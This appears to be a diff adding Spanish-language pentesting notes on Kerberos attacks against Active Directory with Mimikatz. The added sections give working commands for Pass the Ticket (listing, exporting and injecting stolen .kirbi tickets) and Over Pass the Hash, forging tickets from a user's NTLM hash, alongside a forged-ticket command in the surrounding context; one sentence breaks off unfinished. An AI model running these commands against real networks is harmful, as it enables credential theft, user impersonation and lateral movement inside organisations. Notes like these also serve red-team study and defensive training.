@@ -139,9 +139,28 @@ Mimikatz> kerberos::golden /domain:dominio.local /sid:S-1-5-21-xxxxxxxxxx /targe
 
 NOTA: No necesitamos acceso al AD ni descifrar el hash ntlm, incluso no es necesario ejecutar el comando en el servidor comprometido, dado que nosotros falsificaremos el TGS, por lo que podemos ejecutarlo en un windows que no este unido a dominio, solo se requiere conexión al servicio, que en este caso es **servidorweb.dominio.local** 
 
+#### Pass the Ticket:
+Robo de ticket tipo ST o TGT de un equipo ya autenticado en la red, para despues el ticket pasado al KDC o servicio para autenticarse.
+```
+kerberos::list (listar)
+kerberos::list /export (listar y exportar)
+kerberos::list /export /tgt
+kerberos::list /export /service:service_name
+```
+Inyectar el ticket robado:
+```
+kerberos::ptt <ruta_al_ticket.kirbi>
+```
 
+#### Over Pass The Hash / Pass The Key:
+Ataque basado en solicitar un TGT por medio del hash NTLM del usuario al KDC.
 
+En este caso se puede dumpear el NTLM o obtenerse por reponder, para despues 
 
+```
+kerberos::golden /user:usuario /domain:dominio.local /sid:S-1-5-21-xxxxxxxxxx /rc4:hash_ntlm /target:servidor.dominio.local /ticket
+```
+NOTA: La ventaja de este ataque es que puedes ejecutar mimikatz desde una VM que no esta unida a dominio, solo necesitas alcanzar al AD para que sí esta mal configurado puedas pedir TGT.
 
 
 
